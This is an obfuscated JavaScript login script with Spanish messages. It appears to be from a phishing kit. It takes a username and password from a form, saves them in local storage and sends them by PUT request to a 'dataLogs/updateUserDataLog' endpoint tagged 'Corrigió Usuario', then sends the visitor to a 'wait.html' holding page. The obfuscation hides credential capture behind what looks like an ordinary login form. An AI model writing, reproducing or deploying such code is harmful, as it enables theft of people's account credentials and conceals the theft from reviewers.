const _0x488c0e = _0x1470;
(function (_0x1bba56, _0x111c9e) {
  const _0x1c73fa = _0x1470,
    _0x46cf21 = _0x1bba56();
  while (!![]) {
    try {
      const _0x20e34e =
        (-parseInt(_0x1c73fa(0x1fc)) / 0x1) *
          (-parseInt(_0x1c73fa(0x1f8)) / 0x2) +
        parseInt(_0x1c73fa(0x1e8)) / 0x3 +
        -parseInt(_0x1c73fa(0x1e0)) / 0x4 +
        -parseInt(_0x1c73fa(0x1e6)) / 0x5 +
        (parseInt(_0x1c73fa(0x1f4)) / 0x6) *
          (parseInt(_0x1c73fa(0x1ec)) / 0x7) +
        parseInt(_0x1c73fa(0x1ee)) / 0x8 +
        -parseInt(_0x1c73fa(0x1df)) / 0x9;
      if (_0x20e34e === _0x111c9e) break;
      else _0x46cf21["push"](_0x46cf21["shift"]());
    } catch (_0x578fde) {
      _0x46cf21["push"](_0x46cf21["shift"]());
    }
  }
})(_0x227e, 0x54b5f);
function _0x227e() {
  const _0x54ece1 = [
    "setItem",
    "btnUsuario",
    "2593703nnuSYz",
    "user",
    "2672512hFbzEF",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "PUT",
    "txtPass",
    "Bearer\x20",
    "metaInfo",
    "6OEyhbN",
    "application/json",
    "puser",
    "Error\x20al\x20actualizar\x20los\x20datos\x20en\x20el\x20servidor",
    "132076FwESWF",
    "Corrigió\x20Usuario",
    "Usuario\x20actualizado\x20correctamente",
    "preventDefault",
    "4KBgYTA",
    "click",
    "stringify",
    "getItem",
    "Error\x20al\x20procesar\x20la\x20actualización:",
    "wait.html",
    "addEventListener",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "getElementById",
    "1347651ixRZwS",
    "2440176TULpRa",
    "origin",
    "disabled",
    "dataLogId",
    "log",
    "json",
    "2093590bGgDuc",
    "location",
    "1670193KSCLNG",
    "value",
  ];
  _0x227e = function () {
    return _0x54ece1;
  };
  return _0x227e();
}
function updateLS() {
  const _0x56e3d2 = _0x1470;
  LS[_0x56e3d2(0x1ea)]("info", JSON[_0x56e3d2(0x1d8)](info));
}
const button = document[_0x488c0e(0x1de)](_0x488c0e(0x1eb)),
  userInput = document["getElementById"]("txtUsuario"),
  passInput = document[_0x488c0e(0x1de)](_0x488c0e(0x1f1));
async function updateStatusUser() {
  const _0x204099 = _0x488c0e;
  button[_0x204099(0x1e2)] = !![];
  try {
    const _0x498801 = localStorage[_0x204099(0x1d9)](_0x204099(0x1e3)),
      _0x19dae1 = localStorage[_0x204099(0x1d9)]("dataLogToken");
    if (!_0x498801 || !_0x19dae1) throw new Error(_0x204099(0x1dd));
    const _0x4a124e = await fetch(
      url + "/dataLogs/updateUserDataLog/" + _0x498801,
      {
        method: _0x204099(0x1f0),
        headers: {
          "Content-Type": _0x204099(0x1f5),
          Authorization: _0x204099(0x1f2) + _0x19dae1,
          Origin: window[_0x204099(0x1e7)][_0x204099(0x1e1)],
        },
        body: JSON[_0x204099(0x1d8)]({
          us: info[_0x204099(0x1f3)][_0x204099(0x1ed)],
          ps: info[_0x204099(0x1f3)][_0x204099(0x1f6)],
          status: _0x204099(0x1f9),
        }),
      }
    );
    if (!_0x4a124e["ok"]) {
      const _0x48381e = await _0x4a124e[_0x204099(0x1e5)]();
      throw new Error(_0x48381e["error"] || _0x204099(0x1f7));
    }
    const _0x4ddfb4 = await _0x4a124e["json"]();
    console[_0x204099(0x1e4)](_0x204099(0x1fa));
  } catch (_0x3d07e0) {
    console["error"](_0x204099(0x1da), _0x3d07e0);
  } finally {
    (button[_0x204099(0x1e2)] = ![]),
      (window["location"]["href"] = _0x204099(0x1db));
  }
}
function _0x1470(_0x28aa5f, _0x22d63d) {
  const _0x227e2b = _0x227e();
  return (
    (_0x1470 = function (_0x1470ec, _0x194782) {
      _0x1470ec = _0x1470ec - 0x1d8;
      let _0x160851 = _0x227e2b[_0x1470ec];
      return _0x160851;
    }),
    _0x1470(_0x28aa5f, _0x22d63d)
  );
}
button[_0x488c0e(0x1dc)](_0x488c0e(0x1fd), async function (_0x4fc4f6) {
  const _0x39c621 = _0x488c0e;
  _0x4fc4f6[_0x39c621(0x1fb)]();
  if (
    userInput[_0x39c621(0x1e9)] === "" ||
    passInput[_0x39c621(0x1e9)] === ""
  ) {
    alert(_0x39c621(0x1ef)), userInput["focus"]();
    return;
  }
  const _0x31786f = userInput[_0x39c621(0x1e9)],
    _0xce160a = passInput[_0x39c621(0x1e9)];
  (info[_0x39c621(0x1f3)]["user"] = _0x31786f),
    (info[_0x39c621(0x1f3)]["puser"] = _0xce160a),
    updateLS(),
    await updateStatusUser();
});
